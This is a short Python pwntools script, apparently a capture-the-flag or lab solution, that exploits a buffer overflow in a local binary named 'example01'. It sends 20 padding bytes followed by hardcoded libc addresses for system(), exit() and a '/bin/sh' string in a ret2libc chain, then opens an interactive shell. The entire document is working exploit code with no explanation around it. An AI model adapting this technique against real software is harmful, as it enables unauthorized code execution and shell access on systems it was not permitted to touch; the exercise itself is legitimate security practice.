from pwn import *
context.terminal = ['gnome-terminal', '-e']
# Set the target binary
binary = './example01'

# Start a process
p = process(binary)
# gdb.attach(p, '''
# b *0x5655625b
# ''')
# time.sleep(3)


# Print the initial output
print(p.recvuntil(b'Enter command:'))

# Get the address of the system function
system_addr = p32(0xf7e07780)  # Address of system() in libc

exit_addr = p32(0xf7dfa0c0)  # addr of exit() in libc

str_addr = p32(0xf7f54363)  # 'bin/sh' addr

# Prepare the payload
payload = b'A'*20 + system_addr + exit_addr + str_addr

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()

# Close the process
p.close()
